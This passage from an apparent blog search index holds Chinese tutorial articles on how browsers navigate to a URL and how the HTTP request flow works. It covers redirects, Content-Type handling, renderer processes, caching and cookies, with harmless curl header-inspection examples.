事件或者同意了继续后续流程，那么浏览器便进入下图的状态：</p>\n<p><img data-src=\"https://pic.imgdb.cn/item/661ce02468eb9357139f54ab.png\" alt=\"开始加载URL浏览器状态\"></p>\n<p>从图中可以看出，当浏览器刚开始加载一个地址之后，标签页上的图标便进入了加载状态。单此时图中的页面依旧还是之前打开的页面内容，并没有立即替换为极客时间的页面。因为需要等待提交文档阶段，页面内容才会被替换。</p>\n<h3 id=\"URL请求过程\"><a href=\"#URL请求过程\" class=\"headerlink\" title=\"URL请求过程\"></a>URL 请求过程</h3><p>接下来，便进入了页面资源请求过程。这时，浏览器进程会通过进程间通信（IPC）把 URL 请求发送至网络进程，网络进程接收到 URL 请求后，会在这里发起真正的请求流程。那具体流程是怎样的呢？</p>\n<p>首先，网络进程会查询本地缓存是否缓存了该资源。如果有缓存资源，那么直接返回资源给浏览器进程，如果在缓存中没有查找到资源，那么直接进入网络请求流程。这请求前的第一步是要进行 DNS 请求，以获取请求域名的服务器 IP 地址。如果协议是 HTTPS，那么还需要建立 TLS 连接。</p>\n<p>接下来就是利用 IP 地址和服务器建立 TCP 连接。浏览器建立之后，浏览器会构建请求行、请求头信息，并把和该域名相关的 Cookies 等数据附加到请求头中，然后向服务器发送构建的请求信息。</p>\n<p>服务器接收到请求信息后，会根据请求信息生成响应数据（包括响应行、响应头和响应体等信息），并发给网络进程。等网络进程接收了响应行和响应头之后，就开始解析响应头的内容了。（为了方便讲述，下面我将服务器返回的响应头和响应行统称为响应头。）</p>\n<h4 id=\"1-重定向\"><a href=\"#1-重定向\" class=\"headerlink\" title=\"1. 重定向\"></a>1. 重定向</h4><p>在接收到服务器返回的响应头后，网络进程开始解析响应头，如果发现返回的状态码是 301 或者 302，那么说明服务器需要浏览器重定向到其他 URL。这时网络进程会从响应头的 Location 字段里面读取重定向的地址，然后再发起新的 HTTP 或者 HTTPS 请求，一切又重头开始了。</p>\n<p>比如，我们在终端里输入以下命令：</p>\n<figure class=\"highlight shell\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\">curl -i http://time.geekbang.org</span><br></pre></td></tr></tbody></table></figure>\n\n<p><code>curl -I + URL</code> 的命令是接收服务器返回的响应头的信息。执行命令后，我们看到服务器返回的响应头信息如下：</p>\n<p><img data-src=\"https://pic.imgdb.cn/item/661ced8a68eb935713b268a1.png\" alt=\"响应行返回状态码301\"></p>\n<p>从图中可以看出，极客时间服务器会通过重定向的方式把所有 HTTP 请求转换为 HTTPS 请求。也就是说你使用 HTTP 向极客时间服务器请求时，服务器会返回一个包含有 301 或者 302 状态码响应头，并把响应头的 Location 字段中填上 HTTPS 的地址，这就是告诉了浏览器要重新导航到新的地址上。</p>\n<p>下面我们再使用 HTTPS 协议对极客时间发起请求，看看服务器的响应头信息是什么样子的。</p>\n<figure class=\"highlight shell\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\">curl -I https://time.geekbang.org/</span><br></pre></td></tr></tbody></table></figure>\n\n<p>我们看到服务器返回如下信息：</p>\n<p><img data-src=\"https://pic.imgdb.cn/item/661ceeb568eb935713b3acc1.png\" alt=\"响应行返回状态码200\"></p>\n<p>从图中可以看出，服务器返回的响应头的状态码是 200，这是告诉浏览器一切正常，可以继续往下处理该请求了。</p>\n<p>好了，以上是重定向内容的介绍。现在你应该理解了，在导航过程中，如果服务器响应行的状态码包含了 301、302 一类的跳转信息，浏览器会跳转到新的地址继续导航；如果响应行是 200，那么表示浏览器可以继续处理该请求。</p>\n<h4 id=\"2-响应数据类型处理\"><a href=\"#2-响应数据类型处理\" class=\"headerlink\" title=\"2. 响应数据类型处理\"></a>2. 响应数据类型处理</h4><p>在处理了跳转信息之后，我们继续导航流程的分析。URL 请求的数据类型，有时候是一个下载类型，有时候是正常的 HTML 页面，那么浏览器是如何区分它们呢？</p>\n<p>答案是 Content-Type。Content-Type 是 HTTP 头中一个非常重要的字段， 它告诉浏览器服务器返回的响应体数据是什么类型，然后浏览器会根据 Content-Type 的值来决定如何显示响应体的内容。</p>\n<p>这里我们还是以极客时间为例，看看极客时间官网返回的 Content-Type 值是什么。在终端输入以下命令：</p>\n<figure class=\"highlight shell\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\">curl -I https://time.geekbang.org/</span><br></pre></td></tr></tbody></table></figure>\n\n<p>返回信息如下图：</p>\n<p><img data-src=\"https://pic.imgdb.cn/item/661cef7e68eb935713b43ae4.png\" alt=\"含有HTML格式的Content-Type\"></p>\n<p>从图中可以看到，响应头中的 Content-type 字段的值是 text/html，这就是告诉浏览器，服务器返回的数据是 HTML 格式。</p>\n<p>接下来我们再来利用 curl 来请求极客时间安装包的地址，如下所示：</p>\n<figure class=\"highlight shell\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\">curl -I https://res001.geekbang.org/apps/geektime/android/2.3.1/official/geektime_2.3.1_20190527-2136_offical.apk</span><br></pre></td></tr></tbody></table></figure>\n\n<p>请求后返回的响应头信息如下：</p>\n<p><img data-src=\"https://pic.imgdb.cn/item/661cefa368eb935713b44e1d.png\" alt=\"含有stream格式的Content-Type\"></p>\n<p>从返回的响应头信息来看，其 Content-Type 的值是 application/octet-stream，显示数据是字节流类型的，通常情况下，浏览器会按照<strong>下载类型</strong>来处理该请求。</p>\n<p>需要注意的是，如果服务器配置 Content-Type 不正确，比如将 text/html 类型配置成 application/octet-stream 类型，那么浏览器可能会曲解文件内容，比如会将一个本来是用来展示的页面，变成了一个下载文件。</p>\n<p>所以，不同 Content-Type 的后续处理流程也截然不同。如果 Content-Type 字段的值被浏览器判断为<strong>下载类型，那么该请求会被提交给浏览器的下载管理器，同时该 URL 请求的导航流程就此结束</strong>。但如果是 <strong>HTML，那么浏览器则会继续进行导航流程</strong>。由于 Chrome 的页面渲染是运行在渲染进程中的，所以接下来就需要准备渲染进程了。</p>\n<h3 id=\"准备渲染进程\"><a href=\"#准备渲染进程\" class=\"headerlink\" title=\"准备渲染进程\"></a>准备渲染进程</h3><p>默认情况下，Chrome 会为每个页面分配一个渲染进程，也就是说，每打开一个新页面就会配套创建一个新的渲染进程。但是，也有一些例外，在某些情况下，浏览器会让多个页面直接运行在同一个渲染进程中。</p>\n<p>比如我从极客时间的首页里面打开了另外一个页面 —— 算法训练营，我们看下图的 Chrome 的任务管理器截图：</p>\n<p><img data-src=\"https://pic.imgdb.cn/item/661cf5a068eb935713bb62d4.png\" alt=\"多个页面运行在一个渲染进程中\"></p>\n<p>从图中可以看出，打开的这三个页面都是运行在同一个渲染进程中，进程 ID 是 23601。</p>\n<p><strong>那什么情况下多个页面会同时运行在一个渲染进程中呢？</strong></p>\n<p>要解决这个问题，我们就需要先了解下什么是同一站点（same-site）。具体地讲，我们将 “同一站点” 定义为根域名（例如，geekbang.org）加上协议（例如，https:// 或者 http://），还包含了该根域名下的所有子域名和不同的端口，比如下面这三个：</p>\n<figure class=\"highlight shell\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\">https://time.geekbang.org</span><br><span class=\"line\">https://www.geekbang.org</span><br><span class=\"line\">https://www.geekbang.org:8080</span><br></pre></td></tr></tbody></table></figure>\n\n<p>它们都是属于<strong>同一站点</strong>，因为它们的协议都是 HTTPS，而且根域名也都是 geekbang.org。</p>\n<p>Chrome 的默认策略是，每个标签对应一个渲染进程。但如果<strong>从一个页面打开了另一个新页面，而新页面和当前页面属于同一站点的话，那么新页面会复用父页面的渲染进程</strong>。官方把这个默认策略叫 process-per-site-instance。</p>\n<p>那若新页面和当前页面不属于同一站点，情况又会发生什么样的变化呢？比如我通过极客邦页面里的链接打开 InfoQ 的官网（<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuaW5mb3EuY24vJUVGJUJDJTg5JUVGJUJDJThD\">https://www.infoq.cn/），<i class=\"fa fa-external-link-alt\"></i></span> 因为 infoq.cn 和 geekbang.org 不属于同一站点，所以 infoq.cn 会使用一个新的渲染进程，你可以参考下图：</p>\n<p><img data-src=\"https://pic.imgdb.cn/item/661cf5bf68eb935713bb95e2.png\" alt=\"非同一站点使用不同的渲染进程\"></p>\n<p>从图中任务管理器可以看出：由于极客邦和极客时间的标签页拥有<strong>相同的协议和根域名</strong>，所以它们属于<strong>同一站点</strong>，并运行在同一个渲染进程中；而 infoq.cn 的根域名不同于 geekbang.org，也就是说 InfoQ 和极客邦不属于同一站点，因此它们会运行在两个不同的渲染进程之中。</p>\n<p>总结来说，打开一个新页面采用的<strong>渲染进程策略</strong>就是：</p>\n<ul>\n<li>通常情况下，打开新的页面都会使用单独的渲染进程；</li>\n<li>如果从 A 页面打开 B 页面，且 A 和 B 都属于同一站点的话，那么 B 页面复用 A 页面的渲染进程；如果是其他情况，浏览器进程则会为 B 创建一个新的渲染进程。</li>\n</ul>\n<p>渲染进程准备好之后，还不能立即进入文档解析状态，因为此时的文档数据还在网络进程中，并没有提交给渲染进程，所以下一步就进入了提交文档阶段。</p>\n<h3 id=\"提交文档\"><a href=\"#提交文档\" class=\"headerlink\" title=\"提交文档\"></a>提交文档</h3><p>所谓提交文档，就是指浏览器进程将网络进程接收到的 HTML 数据提交给渲染进程，具体流程是这样的：</p>\n<ul>\n<li>首先当浏览器进程接收到网络进程的响应头数据之后，便向渲染进程发起 “提交文档” 的消息；</li>\n<li>渲染进程接收到 “提交文档” 的消息后，会和网络进程建立传输数据的 “管道”；</li>\n<li>等文档数据传输完成之后，渲染进程会返回 “确认提交” 的消息给浏览器进程；</li>\n<li>浏览器进程在收到 “确认提交” 的消息后，会更新浏览器界面状态，包括了安全状态、地址栏的 URL、前进后退的历史状态，并更新 Web 页面。</li>\n</ul>\n<p>其中，当渲染进程<strong>确认提交</strong>之后，更新内容如下图所示：</p>\n<p><img data-src=\"https://pic.imgdb.cn/item/661cf74768eb935713bdca7e.png\" alt=\"导航完成状态\"></p>\n<p>这也就解释了为什么在浏览器的地址栏里面输入了一个地址后，之前的页面没有立马消失，而是要加载一会儿才会更新页面。</p>\n<p>到这里，一个完整的导航流程就 “走” 完了，这之后就要进入渲染阶段了。</p>\n<h3 id=\"渲染阶段\"><a href=\"#渲染阶段\" class=\"headerlink\" title=\"渲染阶段\"></a>渲染阶段</h3><p>一旦文档被提交，渲染进程便开始页面解析和子资源加载了，关于这个阶段的完整过程，我会在下一篇文章中来专门介绍。这里你只需要先了解一旦页面生成完成，渲染进程会发送一个消息给浏览器进程，浏览器接收到消息后，会停止标签图标上的加载动画。如下所示：</p>\n<p><img data-src=\"https://pic.imgdb.cn/item/661cf76a68eb935713be0285.png\" alt=\"渲染结束\"></p>\n<p>至此，一个完整的页面就生成了。那文章开头的 “从输入 URL 到页面展示，这中间发生了什么？” 这个过程及其 “串联” 的问题也就解决了。</p>\n<h2 id=\"总结\"><a href=\"#总结\" class=\"headerlink\" title=\"总结\"></a>总结</h2><p>好了，今天就到这里，下面我来简单总结下这篇文章的要点：</p>\n<ul>\n<li>服务器可以根据响应头来控制浏览器的行为，如跳转、网络数据类型判断。</li>\n<li>Chrome 默认采用每个标签对应一个渲染进程，但是如果两个页面属于同一站点，那这两个标签会使用同一个渲染进程。</li>\n<li>浏览器的导航过程涵盖了从用户发起请求到提交文档给渲染进程的中间所有阶段。</li>\n</ul>\n<p>导航流程很重要，它是网络加载流程和渲染流程之间的一座桥梁，如果你理解了导航流程，那么你就能完整串起来整个页面显示流程，这对于你理解浏览器的工作原理起到了点睛的作用。</p>\n","categories":["浏览器","protocol"],"tags":["前端","浏览器","http"]},{"title":"HTTP 请求流程","url":"//browser/protocol/http/flow.html","content":"<p>HTTP 是一种允许浏览器向服务器获取资源的协议，是 Web 的基础，通常由浏览器发起请求，用来获取不同类型的文件，例如 HTML 文件、CSS 文件、JavaScript 文件、图片、视频等。此外，HTTP 也是浏览器使用最广的协议，所以要想学好浏览器，就要先深入了解 HTTP。</p>\n<p>不知道你是否有过下面这些疑问：</p>\n<ol>\n<li>为什么通常在第一次访问一个站点时，打开速度很慢，当再次访问这个站点时，速度就很快了？</li>\n<li>当登录过一个网站之后，下次再访问该站点，就已经处于登录状态了，这是怎么做到的呢？</li>\n</ol>\n<p>这一切的秘密都隐藏在 HTTP 的请求过程中。所以，在今天这篇文章中，我将通过分析一个 HTTP 请求过程中每一步的状态来带你了解完整的 HTTP 请求过程，希望你看完这篇文章后，能够对 HTTP 协议有个全新的认识。</p>\n<h2 id=\"浏览器端发起HTTP请求流程\"><a href=\"#浏览器端发起HTTP请求流程\" class=\"headerlink\" title=\"浏览器端发起HTTP请求流程\"></a>浏览器端发起 HTTP 请求流程</h2><p>如果你在浏览器地址栏里键入极客时间网站的地址：<code>http://time.geekbang.org/index.html</code>，那么接下来，浏览器会完成哪些动作呢？下面我们就一步一步详细 “追踪” 下。</p>\n<h3 id=\"1-构建请求\"><a href=\"#1-构建请求\" class=\"headerlink\" title=\"1. 构建请求\"></a>1. 构建请求</h3><p>首先，浏览器构建请求行信息（如下所示），构建好后，浏览器准备发起网络请求。</p>\n<figure class=\"highlight shell\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\">GET /index.html HTTP1.1</span><br></pre></td></tr></tbody></table></figure>\n\n<h3 id=\"2-查找缓存\"><a href=\"#2-查找缓存\" class=\"headerlink\" title=\"2. 查找缓存\"></a>2. 查找缓存</h3><p>在真正发起网络请求之前，浏览器会先在浏览器缓存中查询是否有要请求的文件。其中，浏览器缓存是一种在本地保存资源副本，以供下次请求时直接使用的技术。</p>\n<p>当浏览器发现请求的资源已经在浏览器缓存中存有副本，它会拦截请求，返回该资源的副本，并直接结束请求，而不会再去源服务器重新下载。这样做的好处有：</p>\n<ul>\n<li>缓解服务器端压力，提升性能（获取资源的耗时更短了）；</li>\n<li>对于网站来说，缓存是实现快速资源加载的重要组成部分。</li>\n</ul>\n<p>当然，如果缓存查找失败，就会进入网络请求过程了。</p>\n<h3 id=\"3-准备IP地址和端口\"><a href=\"#3-准备IP地址和端口\" class=\"headerlink\" title=\"3. 准备IP地址和端口\"></a>3. 准备 IP 地址和端口</h3><p>不过，先不急，在了解网络请求之前，我们需要先看看 HTTP 和 TCP 的关系。因为浏览器使用 <strong>HTTP 协议作为应用层协议</strong>，用来封装请求的文本信息；并使用 <strong>TCP/IP 作传输层协议</strong>将它发到网络上，所以在 HTTP 工作开始之前，浏览器需要通过 TCP 与服务器建立连接。也就是说 <strong>HTTP 的内容是通过 TCP 的传输数据阶段来实现的</strong>，你可以结合下图更好地理解这二者的关系。</p>\n<p><img data-src=\"https://pic.imgdb.cn/item/6617817268eb93571332e6ba.png\" alt=\"HTTP和TCP的关系图\"></p>\n<p>那接下来你可以思考这么 “一连串” 问题：</p>\n<ul>\n<li>HTTP 网络请求的第一步是做什么呢？结合上图看，是和服务器建立 TCP 连接。</li>\n<li>那建立连接的信息都有了吗？上一篇文章中，我们讲到建立 TCP 连接的第一步就是需要准备 IP 地址和端口号。</li>\n<li>那怎么获取 IP 地址和端口号呢？这得看看我们现在有什么，我们有一个 URL 地址，那么是否可以利用 URL 地址来获取 IP 和端口信息呢？</li>\n</ul>\n<p>在上一篇文章中，我们介绍过数据包都是通过 IP 地址传输给接收方的。由于 IP 地址是数字标识，比如极客时间网站的 IP 是 47.108.140.70, 难以记忆，但使用极客时间的域名（time.geekbang.org）就好记多了，所以基于这个需求又出现了一个服务，负责把域名和 IP 地址做一一映射关系。这套域名映射为 IP 的系统就叫做 “<strong>域名系统</strong>”，简称 <strong>DNS</strong>（Domain Name System）。</p>\n<p>所以，这样一路推导下来，你会发现在<strong>第一步浏览器会请求 DNS 返回域名对应的 IP</strong>。当然浏览器还提供了 <strong>DNS 数据缓存服务</strong>，如果某个域名已经解析过了，那么浏览器会缓存解析的结果，以供下次查询时直接使用，这样也会减少一次网络请求。</p>\n<p>拿到 IP 之后，接下来就需要获取端口号了。通常情况下，如果 URL 没有特别指明端口号，那么 HTTP 协议默认是 80 端口。</p>\n<h3 id=\"4-等待TCP队列\"><a href=\"#4-等待TCP队列\" class=\"headerlink\" title=\"4. 等待TCP队列\"></a>4. 等待 TCP 队列</h3><p>现在已经把端口和 IP 地址都准备好了，那么下一步是不是可以建立 TCP 连接了呢？</p>\n<p>答案依然是 “不行”。Chrome 有个机制，同一个域名同时最多只能建立 6 个 TCP 连接，如果在同一个域名下同时有 10 个请求发生，那么其中 4 个请求会进入排队等待状态，直至进行中的请求完成。</p>\n<p>当然，如果当前请求数量少于 6，会直接进入下一步，建立 TCP 连接。</p>\n<h3 id=\"5-建立TCP连接\"><a href=\"#5-建立TCP连接\" class=\"headerlink\" title=\"5. 建立TCP连接\"></a>5. 建立 TCP 连接</h3><p>排队等待结束之后，终于可以快乐地和服务器握手了，在 HTTP 工作开始之前，浏览器通过 TCP 与服务器建立连接。而 TCP 的工作方式，我在上一篇文章中已经做过详细介绍了，如果有必要，你可以自行回顾下，这里我就不再重复讲述了。</p>\n<h3 id=\"6-发送HTTP请求\"><a href=\"#6-发送HTTP请求\" class=\"headerlink\" title=\"6. 发送HTTP请求\"></a>6. 发送 HTTP 请求</h3><p>一旦建立了 TCP 连接，浏览器就可以和服务器进行通信了。而 HTTP 中的数据正是在这个通信过程中传输的。</p>\n<p>你可以结合下图来理解，浏览器是如何发送请求信息给服务器的。</p>\n<p><img data-src=\"https://pic.imgdb.cn/item/6617825968eb93571334d43f.png\" alt=\"HTTP请求数据格式\"></p>\n<p>首先浏览器会向服务器发送请求行，它包括了请求方法、请求 URI（Uniform Resource Identifier）和 HTTP 版本协议。</p>\n<p>发送请求行，就是告诉服务器浏览器需要什么资源，最常用的请求方法是 Get。比如，直接在浏览器地址栏键入极客时间的域名（time.geekbang.org），这就是告诉服务器要 Get 它的首页资源。</p>\n<p>另外一个常用的请求方法是 POST，它用于发送一些数据给服务器，比如登录一个网站，就需要通过 POST 方法把用户信息发送给服务器。如果使用 POST 方法，那么浏览器还要准备数据给服务器，这里准备的数据是通过请求体来发送。</p>\n<p>在浏览器发送请求行命令之后，还要以请求头形式发送其他一些信息，把浏览器的一些基础信息告诉服务器。比如包含了浏览器所使用的操作系统、浏览器内核等信息，以及当前请求的域名信息、浏览器端的 Cookie 信息，等等。</p>\n<h2 id=\"服务器端处理HTTP请求流程\"><a href=\"#服务器端处理HTTP请求流程\" class=\"headerlink\" title=\"服务器端处理HTTP请求流程\"></a>服务器端处理 HTTP 请求流程</h2><p>历经千辛万苦，HTTP 的请求信息终于被送达了服务器。接下来，服务器会根据浏览器的请求信息来准备相应的内容。</p>\n<h3 id=\"1-返回请求\"><a href=\"#1-返回请求\" class=\"headerlink\" title=\"1. 返回请求\"></a>1. 返回请求</h3><p>一旦服务器处理结束，便可以返回数据给浏览器了。你可以通过工具软件 curl 来查看返回请求数据，具体使用方法是在命令行中输入以下命令：</p>\n<figure class=\"highlight shell\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\">curl -i  https://time.geekbang.org/</span><br></pre></td></tr></tbody></table></figure>\n\n<p>注意这里加上了 <code>-i</code> 是为了返回响应行、响应头和响应体的数据，返回的结果如下图所示，你可以结合这些数据来理解服务器是如何响应浏览器的。</p>\n<p><img data-src=\"https://pic.imgdb.cn/item/661792e568eb9357134fa9f3.png\" alt=\"服务器响应的数据格式\"></p>\n<p>首先服务器会返回响应行，包括协议版本和状态码。</p>\n<p>但并不是所有的请求都可以被服务器处理的，那么一些无法处理或者处理出错的信息，怎么办呢？服务器会通过请求行的状态码来告诉浏览器它的处理结果，比如：</p>\n<ul>\n<li>最常用的状态码是 200，表示处理成功；</li>\n<li>如果没有找到页面，则会返回 404。</li>\n</ul>\n<p>状态码类型很多，这里我就不过多介绍了，网上有很多资料，你可以自行查询和学习。</p>\n<p>随后，正如浏览器会随同请求发送请求头一样，服务器也会随同响应向浏览器发送响应头。响应头包含了服务器自身的一些信息，比如服务器生成返回数据的时间、返回的数据类型（JSON、HTML、流媒体等类型），以及服务器要在客户端保存的 Cookie 等信息。</p>\n<p>发送完响应头后，服务器就可以继续发送响应体的数据，通常，响应体就包含了 HTML 的实际内容。</p>\n<p>以上这些就是服务器响应浏览器的具体过程。</p>\n<h3 id=\"2-断开连接\"><a href=\"#2-断开连接\" class=\"headerlink\" title=\"2. 断开连接\"></a>2. 断开连接</h3><p>通常情况下，一旦服务器向客户端返回了请求数据，它就要关闭 TCP 连接。不过如果浏览器或者服务器在其头信息中加入了：</p>\n<figure class=\"highlight shell\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\">Connection:Keep-Alive </span><br></pre></td></tr></tbody></table></figure>\n\n<p>那么 TCP 连接在发送后将仍然保持打开状态，这样浏览器就可以继续通过同一个 TCP 连接发送请求。保持 TCP 连接可以省去下次请求时需要建立连接的时间，提升资源加载速度。比如，一个 Web 页面中内嵌的图片就都来自同一个 Web 站点，如果初始化了一个持久连接，你就可以复用该连接，以请求其他资源，而不需要重新再建立新的 TCP 连接。</p>\n<h3 id=\"3-重定向\"><a href=\"#3-重定向\" class=\"headerlink\" title=\"3. 重定向\"></a>3. 重定向</h3><p>到这里似乎请求流程快结束了，不过还有一种情况你需要了解下，比如当你在浏览器中打开 <code>geekbang.org</code> 后，你会发现最终打开的页面地址是 <code>https://www.geekbang.org</code>。</p>\n<p>这两个 URL 之所以不一样，是因为涉及到了一个重定向操作。跟前面一样，你依然可以使用 curl 来查看下请求 <code>geekbang.org</code> 会返回什么内容？</p>\n<p>在控制台输入如下命令：</p>\n<figure class=\"highlight shell\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\">curl -I geekbang.org</span><br></pre></td></tr></tbody></table></figure>\n\n<p>注意这里输入的参数是 - I，和 - i 不一样，-I 表示只需要获取响应头和响应行数据，而不需要获取响应体的数据，最终返回的数据如下图所示：</p>\n<p><img data-src=\"https://pic.imgdb.cn/item/6617935568eb9357135076d5.jpg\" alt=\"服务器返回响应行和响应头（含重定向格式）\"></p>\n<p>从图中你可以看到，响应行返回的状态码是 301，状态 301 就是告诉浏览器，我需要重定向到另外一个网址，而需要重定向的网址正是包含在响应头的 Location 字段中，接下来，浏览器获取 Location 字段中的地址，并使用该地址重新导航，这就是一个完整重定向的执行流程。这也就解释了为什么输入的是 geekbang.org，最终打开的却是 <code>https://www.geekbang.org</code> 了。</p>\n<p>不过也不要认为这种跳转是必然的。如果你打开 <code>https://12306.cn</code>，你会发现这个站点是打不开的。这是因为 12306 的服务器并没有处理跳转，所以必须要手动输入完整的 <code>https://www.12306.cn</code> 才能打开页面。</p>\n<h2 id=\"问题解答\"><a href=\"#问题解答\" class=\"headerlink\" title=\"问题解答\"></a>问题解答</h2><p>说了这么多，相信你现在已经了解了 HTTP 的请求流程，那现在我们再回过头来看看文章开头提出的问题。</p>\n<h3 id=\"1-为什么很多站点第二次打开速度会很快？\"><a href=\"#1-为什么很多站点第二次打开速度会很快？\" class=\"headerlink\" title=\"1. 为什么很多站点第二次打开速度会很快？\"></a>1. 为什么很多站点第二次打开速度会很快？</h3><p>如果第二次页面打开很快，主要原因是第一次加载页面过程中，缓存了一些耗时的数据。</p>\n<p>那么，哪些数据会被缓存呢？从上面介绍的核心请求路径可以发现，<strong>DNS 缓存</strong>和<strong>页面资源缓存</strong>这两块数据是会被浏览器缓存的。其中，DNS 缓存比较简单，它主要就是在浏览器本地把对应的 IP 和域名关联起来，这里就不做过多分析了。</p>\n<p>我们重点看下浏览器资源缓存，下面是缓存处理的过程：</p>\n<p><img data-src=\"https://pic.imgdb.cn/item/661793fc68eb93571351b089.png\" alt=\"缓存查找流程示意图\"></p>\n<p>首先，我们看下服务器是通过什么方式让浏览器缓存数据的？</p>\n<p>从上图的第一次请求可以看出，当服务器返回 HTTP 响应头给浏览器时，浏览器是通过响应头中的 Cache-Control 字段来设置是否缓存该资源。通常，我们还需要为这个资源设置一个缓存过期时长，而这个时长是通过 Cache-Control 中的 Max-age 参数来设置的，比如上图设置的缓存过期时间是 2000 秒。</p>\n<figure class=\"highlight shell\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\">Cache-Control:Max-age=2000</span><br></pre></td></tr></tbody></table></figure>\n\n<p>这也就意味着，在该缓存资源还未过期的情况下，如果再次请求该资源，会直接返回缓存中的资源给浏览器。</p>\n<p>但如果缓存过期了，浏览器则会继续发起网络请求，并且在 HTTP 请求头中带上：</p>\n<figure class=\"highlight shell\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\">If-None-Match:\"4f80f-13c-3a1xb12a\"</span><br></pre></td></tr></tbody></table></figure>\n\n<p>服务器收到请求头后，会根据 If-None-Match 的值来判断请求的资源是否有更新。</p>\n<ul>\n<li>如果没有更新，就返回 304 状态码，相当于服务器告诉浏览器：“这个缓存可以继续使用，这次就不重复发送数据给你了。”</li>\n<li> 如果资源有更新，服务器就直接返回最新资源给浏览器。</li>\n</ul>\n<p>关于缓存的细节内容特别多，具体细节你可以参考这篇 HTTP 缓存，在这里我就不赘述了。</p>\n<p>简要来说，很多网站第二次访问能够秒开，是因为这些网站把很多资源都缓存在了本地，浏览器缓存直接使用本地副本来回应请求，而不会产生真实的网络请求，从而节省了时间。同时，DNS 数据也被浏览器缓存了，这又省去了 DNS 查询环节。</p>\n<h3 id=\"2-登录状态是如何保持的？\"><a href=\"#2-登录状态是如何保持的？\" class=\"headerlink\" title=\"2. 登录状态是如何保持的？\"></a>2. 登录状态是如何保持的？</h3><p>通过上面的介绍，你已经了解了缓存是如何工作的。下面我们再一起看下登录状态是如何保持的。</p>\n<ul>\n<li>用户打开登录页面，在登录框里填入用户名和密码，点击确定按钮。点击按钮会触发页面脚本生成用户登录信息，然后调用 POST 方法提交用户登录信息给服务器。</li>\n<li>服务器接收到浏览器提交的信息之后，查询后台，验证用户登录信息是否正确，如果正确的话，会生成一段表示用户身份的字符串，并把该字符串写到响应头的 Set-Cookie 字段里，如下所示，然后把响应头发送给浏览器。</li>\n</ul>\n<figure class=\"highlight shell\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\">Set-Cookie: UID=3431uad;</span><br></pre></td></tr></tbody></table></figure>\n\n<ul>\n<li>浏览器在接收到服务器的响应头后，开始解析响应头，如果遇到响应头里含有 Set-Cookie 字段的情况，浏览器就会把这个字段信息保存到本地。比如把 UID=3431uad 保持到本地。</li>\n<li>当用户再次访问时，浏览器会发起 HTTP 请求，但在发起请求之前，浏览器会读取之前保存的 Cookie 数据，并把数据写进请求头里的 Cookie 字段里（如下所示），然后浏览器再将请求头发送给服务器。</li>\n</ul>\n<figure class=\"highlight shell\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\">Cookie: UID=3431uad;</span><br></pre></td></tr></tbody></table></figure>\n\n<ul>\n<li>服务器在收到 HTTP 请求头数据之后，就会查找请求头里面的 “Cookie” 字段信息，当查找到包含 UID=3431uad 的信息时，服务器查询后台，并判断该用户是已登录状态，然后生成含有该用户信息的页面数据，并把生成的数据发送给浏览器。</li>\n<li>浏览器在接收到该含有当前用户的页面数据后，就可以正确展示用户登录的状态信息了。</li>\n</ul>\n<p>好了，通过这个流程你可以知道浏览器页面状态是通过使用 Cookie 来实现的。Cookie 流程可以参考下图：</p>\n<p><img data-src=\"https://pic.imgdb.cn/item/6617947368eb93571352ffc1.png\" alt=\"Cookie流程图\"></p>\n<p>简单地说，如果服务器端发送的响应头内有 Set-Cookie 的字段，那么浏览器就会将该字段的内容保持到本地。当下次客户端再往该服务器发送请求时，客户端会自动在请求头中加入 Cookie 值后再发送出去。服务器端发现客户端发送过来的 Cookie 后，会去检查究竟是从哪一个客户端发来的连接请求，然后对比服务器上的记录，最后得到该用户的状态信息。</p>\n<h2 id=\"总结\"><a href=\"#总结\" class=\"headerlink\" title=\"总结\"></a>总结</h2><p>本篇文章的内容比较多、比较碎，但是非常重要，所以我先来总结下今天的主要内容。</p>\n<p>为了便于你理解，我画了下面这张详细的 “HTTP 请求示意图”，用来展现浏览器中的 HTTP 请求所经历的各个阶段。</p>\n<p><img data-src=\"https://pic.imgdb.cn/item/661794b368eb9357135378b3.png\" alt=\"HTTP请求流程示意图\"></p>\n<p>从图中可以看到，浏览器中的 HTTP 请求从发起到结束一共经历了如下八个阶段：构建请求、查找缓存、准备 IP 和端口、等待 TCP 队列、建立 TCP 连接、发起 HTTP 请求、服务器处理请求、服务器返回请求和断开连接。</p>\n<p>然后我还通过 HTTP 请求路径解答了两个经常会碰到的问题，一个涉及到了 Cache 流程，另外一个涉及到如何使用 Cookie 来进行状态管理。</p>\n<p>通过今天系统的讲解，想必你已经了解了一个 HTTP 完整的工作流程，相信这些知识点之于你以后的学习或工作会很有帮助。</p>\n<p>另外，你应该也看出来了本篇文章是有很多分析问题的思路在里面的。所以在学习过程中，你也要学会提问，通过最终要做什么和现在有什么，去一步步分析并提出一些问题，让疑问带领着你去学习，抓住几个本质的问题就可以学透相关知识点，让你能站在更高维度去查看整体框架。希望它能成为你的一个学习技巧吧！</p>\n<h2 id=\"课外作业\"><a href=\"#课外作业\" class=\"headerlink\" title=\"课外作业\"></a>课外作业</h2><p>最后，还是留给你个思考题：结合今天所讲 HTTP 请求的各个阶段，如果一个页面的网络加载时间过久，你是如何分析卡在哪个阶段的？</p>\n<p>欢迎在留言区与我分享你的想法，也欢迎你在留言区记录你的思考过程。感谢阅读，如果你觉得这篇文章对你有帮助的话，也欢迎把它分享给更多的朋友。</p>\n","categories":["浏览器","protocol"],"tags":["前端","浏览器","http"]},{"title":"HTTPS 和 HTTP 的区别","url":"//browser/protocol/http-https.html","content":"<p><strong>HTTP</strong>: 是一种无状态的请求 - 响应协议。是互联网上应用最广泛的一种通讯协议，基于 TCP ，可以使浏览器工作效率更为高效，减少网络传输。</p>\n<p><strong>HTTPS</strong>: 是 HTTP 的加强版，可以认为是 HTTP + SSL (Secure Socket Layer)。 在 HTTP 